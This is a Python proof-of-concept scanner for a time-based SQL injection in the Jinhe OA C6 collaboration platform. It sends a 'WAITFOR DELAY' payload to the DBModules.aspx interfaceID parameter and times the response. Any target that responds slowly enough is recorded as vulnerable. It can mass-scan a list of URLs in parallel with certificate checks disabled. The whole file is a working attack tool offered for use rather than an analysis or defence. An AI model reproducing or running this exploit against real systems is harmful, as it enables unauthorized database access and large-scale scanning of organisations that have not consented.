import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """

       _ _       __       
      (_|_)___  / /_  ___ 
     / / / __ \/ __ \/ _ \
    / / / / / / / / /  __/
 __/ /_/_/ /_/_/ /_/\___/ 
/___/                     

"""
    print(test)


def poc(target):
    payload = "/C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:5'--"
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Connection":"close"
    }
    try:
        res1 = requests.get(url=target ,verify=False, headers=headers, timeout=15,proxies=proxies)
        res2 = requests.get(url=target+payload, verify=False, headers=headers, timeout=15)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time2 - time1 >= 5 and time2 > 5:
            print(f"[+]{target}存在延时注入漏洞")
            with open("../金和_result.txt", "a", encoding="utf-8") as f:
                f.write(f"[+]{target}存在延时注入漏洞\n")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")


def main():
    banner()
    parser = argparse.ArgumentParser(description="金和OA-C6协同管理平台DBModules.aspx存在SQL注入漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()